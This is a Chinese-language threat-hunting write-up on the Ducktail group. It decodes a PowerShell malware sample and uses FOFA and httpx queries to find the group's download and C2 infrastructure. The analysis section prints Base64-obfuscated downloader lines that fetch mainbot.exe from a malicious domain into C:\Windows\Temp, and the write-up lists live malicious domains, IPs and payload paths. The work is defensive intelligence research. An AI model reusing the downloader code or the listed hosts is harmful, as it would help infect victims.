![1](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail%E4%B8%AD%E6%96%87%E5%B0%81%E9%9D%A2.png)

# FOFA资产拓线实战系列：Ducktail犯罪组织

## 概述
Ducktail是一个2021年被发现的网络犯罪组织，具有越南背景。该组织主要针对Facebook企业账号进行攻击，通过伪装成图片、文档等文件的恶意程序，利用鱼叉式攻击方式攻击有权管理Facebook企业账号的个人。一旦获取目标账号权限，他们就会发布广告，损害受害者声誉并获利。

本文通过分析公开的IOC进行分析，并在FOFA拓线的过程中，**不仅仅发现了该组织未被覆盖的资产，还发现了该犯罪组织有对其域名资产进行反复使用的情况，该组织会对其已下线的资产重复启用。**

## 线索分析思路
我们从Yogesh  Londhe分享的IOC中找到了Ducktail的组织信息，其中有两个样本：

![2](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail2.png)


利用 VT 进行样本分析,得到回链地址为：gdfsgfdrgetgergdsf[.]tech

![3](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail3.png)

下载其中的 jpg 文件，发现该脚本中存在Download-FileWithRetry函数，提供远程文件下载功能，它尝试下载一个文件到指定的目标路径，并在下载失败时会进行重试。

```
https://gdfsgfdrgetgergdsf.tech/file/ps/330d9d3b5819c6c71029767bfb8c0ae1.jpg
```

![4](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail4.png)

在该函数的调用过程中分析，里面的远程下载文件的参数为$cnxjunbsg + $egdac。

ownload-FileWithRetry -url ($cnxjunbsg + $egdac) -destination ($lafaelcbl + $yzabgcjvrd);

而具体参数的值为：

```
$cnxjunbsg=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aHR0cDovL2dkZnNnZmRyZw=="));
$egdac=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("ZXRnZXJnZHNmLnRlY2gvZmlsZS90L21haW5ib3QuZXhl"));
$lafaelcbl=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("QzpcVw=="));
$yzabgcjvrd=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aW5kb3dzXFRlbXBcc3Zjekhvc3QuZXhl"));
```

对这些base64加密的参数进行解密后，发现具体用途是从该网站上下载exe文件，并且存储到本地。

```
aHR0cDovL2dkZnNnZmRyZw==ZXRnZXJnZHNmLnRlY2gvZmlsZS90L21haW5ib3QuZXhl
解密为http://gdfsgfdrgetgergdsf.tech/file/t/mainbot.exe
```

存储到本地后的文件和路径为：

```
QzpcVw==aW5kb3dzXFRlbXBcc3Zjekhvc3QuZXhl
解密为C:\Windows\Temp\svczHost.exe
```

使用VT对exe进行动态分析，发现其C2 IP(138.201.8.186)

```
https://www.virustotal.com/gui/file/e916b412760ea5b9ab66df77808337a632c130a3d1820df2a2d4d1e5e28bc21c/behavior
```

![5](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail5.png)

### 分析结论

```
整合目前提取到的信息，我们进行一个汇总，发现该犯罪组织拥有多个IOC的特征。
1、文件下载路径固定：
  /file/t/mainbot.exe
  /file/t/RdpService.exe
  /file/t/TermService.exe
  /file/rdpwrap.txt
2、认证路径固定且返回包大小相同
  /api/check
  （hxxp://138.201.8.186/api/check [200] [355]）
3、域名地址均通过Cloudflare代理流量，经过CDN进行中转
```

## FOFA拓线

### cloudflare规则

首先对gdfsgfdrgetgergdsf.tech域名在FOFA上进行查找，总结其展示的特征，并对其特征进行一个归类整理。这里提取的特征包括它的header响应头、图标情况、证书情况、JARM值、body计算的hash值等维度，整理之后可以得出以下特征组合。
```
header="HTTP/1.1 404 Not Found" && header="Server: cloudflare" && icon_hash="" && header="Transfer-Encoding: chunked" && cert.issuer!="" && cert.subject.org="" && cert.issuer.cn!="" && cert.is_valid=true && jarm="29d3dd00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365" && body_hash="-1840324437" && header!="X-Powered-By" && header!="Strict-Transport-Security" && header!="Pragma"
```

![6](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail6.png)

除了上述的特征提取，还可以发现该条数据的运营商是cloudflare，且不存在图标和标题，因为其header响应的格式都是相同的结构，所以可以直接取计算的hash值进行组合，语法如下：

```
org="CLOUDFLARENET" && icon_hash="" && title="" && header_hash="-2069571899"
```

![7](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail7.png)

经过验证，两条语法规则都可以匹配到已知的IOC。

![8](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail8.png)


将数据取出之后对提取到的固定路径进行碰撞匹配，此处使用的工具为fofax。

```
/file/t/mainbot.exe
/api/check
```

![9](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail9.png)

![10](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail10.png)

碰撞出moutainseagroup.com域名可以下载该文件，并且用其它路径进行二次验证发现依然存在。使用api/check手工验证:

![11](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail11.png)

![12](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail12.png)

根据其特征确认为未知的恶意域名，在威胁情报平台进行查询时发现该域名未被覆盖。

![13](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail13.png)


有意思的是，我们在早期对该组织进行分析的时候，gdfsgfdrgetgergdsf.tech是无法访问的，但是另一个域名wordpress.ductai.xyz则是活跃状态，并可以进行恶意文件下载。

![14](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail14.png)

但是在梳理文章的时候发现，gdfsgfdrgetgergdsf.tech域名又可以正常访问并下载了。但是"wordpress.ductai.xyz"域名又无法访问了，说明该组织利用这些域名是在一个周期内使用的，并且不轻易废弃曾经使用过的域名。
得到已知存活的IOC为：

```
dailyfasterauto.info
gdfsgfdrgetgergdsf.tech
moutainseagroup.com
```

### C2规则

接着分析另一个线索，通过获得到的IP 138.201.8.186 查找存在相同模板的站点。

![15](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail15.png)

根据其本身特征进行归类，形成的语法如下：

```
header="404 Not Found" && header="Transfer-Encoding: chunked" && header="Server: Microsoft-IIS" && icon_hash="" && title="" && header_hash="-324809210"
```

![16](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail16.png)

但是该模板由于误报率偏高，需要配合路径 /api/check组合判断，我们继续使用fofax。Fofax的命令行语句为：

```
fofax -q 'header="404 Not Found" && header="Transfer-Encoding: chunked" && header="Server: Microsoft-IIS" && icon_hash="" && title="" && header_hash="-324809210"' -fs 10000 | httpx -path /api/check -sc -cl -mc 200 -ml 355
```

得到一批新的存活IOC

![17](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail17.png)

```
118.69.35.98:8001
118.69.35.98:8000
138.201.8.186
138.201.8.186:8000
23.88.71.29:8000
fggfdbvcbvcbcboxes.online
sofggfdbvcbvcbc.online
t.sofggfdbvcbvcbc.online
t.sofggfdbvcbvcbc.online:8000
www.sofggfdbvcbvcbc.online:8000
www.sofggfdbvcbvcbc.online
```

我们继续将以上域名与IP通过路径验证。

```
cat url.txt | httpx -sc -cl -path path.txt -mc 200
```

![18](https://github.com/FofaInfo/Awesome-FOFA/blob/4789cc8a27479fce5a7125b4fc6821b61bf4281e/Storage/ducktail/ducktail18.png)


## 总结

通过对部分IOC进行拓线分析，我们成功发现了该组织的C2特征。并在研究过程中不仅仅发现了该组织未被覆盖标记的资产，还发现了该犯罪组织有对其域名资产进行反复使用的情况，该组织会对其已下线的资产重复启用。

这个案例，对威胁情报的分析和识别包含了二级目录碰撞等部分。结合FOFA平台的持续信息收集能力，如果组织特征未发生变化，对该语法规则进行资产监控，定期拉取数据碰撞，我们就可以动态获取最新的资产信息并及时覆盖，从而更快地获取威胁情报。

## 附录
IOC及威胁情报平台覆盖情况：

| IOC  | Threatbook  | Virustotal  | Qianxin  |
|:----------|:----------|:----------|:----------|
| dailyfasterauto.info    |     | 恶意    | APT    |
| gdfsgfdrgetgergdsf.tech    | 恶意    | 恶意    | APT   |
| moutainseagroup.com    |    |    |     |
| 118.69.35.98   |    | 恶意   | 可疑   |
| 138.201.8.186    |     | 恶意    | APT    |
| 23.88.71.29   | 恶意    | 恶意    | APT    |
| fggfdbvcbvcbcboxes.online    |     | 恶意   |    |
| sofggfdbvcbvcbc.online    |    | 恶意   | APT    |



## References:

Ducktail and Peeling the Layers of PowerShell

https://www.esentire.com/blog/ducktail-and-peeling-the-layers-of-powershell

https://twitter.com/suyog41/status/1738073411585478697

https://github.com/xiecat/fofax